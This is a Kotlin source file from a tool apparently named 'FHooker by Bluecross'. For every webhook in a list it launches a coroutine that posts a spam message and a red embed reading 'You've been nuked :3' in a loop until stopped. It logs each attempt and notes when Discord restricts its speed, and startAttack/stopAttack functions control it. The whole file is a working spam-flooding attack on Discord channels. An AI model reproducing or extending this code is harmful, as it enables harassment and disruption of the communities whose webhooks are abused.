package idk.bluecross.fhooker.logic

import idk.bluecross.fhooker.Globals
import idk.bluecross.fhooker.util.log
import idk.bluecross.fhooker.util.showError
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.awt.Color
import java.io.FileNotFoundException
import kotlin.concurrent.thread

var stopping = false
fun run(discord: DiscordApi) {
    GlobalScope.launch {
        try {
            val text = Globals.spamText
            var stuckIndicator = 0
            discord.clearEmbeds()
            discord.addEmbed(
                DiscordApi.EmbedObject()
                    .setTitle("You've been nuked :3")
                    .setDescription("FHooker by Bluecross")
                    .setColor(Color.RED)
            )
            discord.setContent(text)
            var i = 0
            while (!stopping) {
                i++
                if (Globals.speedIsRestricted) {
                    showError(true, "Discord restricted speedof our spam messages :(")
                } else (showError(false, ""))
                discord.execute()
                log("tried to send at ${discord.webhook} $i times")
                delay(Globals.spamDelay.toLong())
            }
        }catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

fun startAttack() {
    Globals.attackingRn = true
    stopping = false
    Globals.webhooks.forEach {
        run(DiscordApi(it))
        println("running coroutine for $it")
    }
}

fun stopAttack() {
    Globals.attackingRn = false
    stopping = true
}